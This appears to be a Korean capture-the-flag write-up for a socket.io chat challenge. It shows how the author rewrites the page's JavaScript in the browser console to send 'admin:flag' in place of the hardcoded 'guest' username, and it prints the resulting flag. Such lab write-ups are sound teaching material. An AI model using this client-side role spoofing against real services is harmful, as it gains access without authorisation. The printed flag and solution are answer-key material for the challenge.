# 자바스크립트 함수 수정

send를 보내고 답을 받을 수가 있다. 
소켓을 통해서 통신을 하며,
flag 명령어를 넣으면 권한이 없다고 나온다.

스크립트를 보니, username이 guest라고 되어있다. 
admin으로 바꿔서 해본다. 

```html
<script>
    $(function () {
      var username = "guest";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+$('#m').val());
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });
</script>
```

이런 스크립트 요소가 있는데. 
콘솔에서 아래와 같이 바꾼다. 

```javascript
    $(function () {
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd','admin:flag');
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });
```

그리고 아무 문자나 send하면, flag가 나온다. 

```
FLAG{do_you_know_about_darkhotel}
```

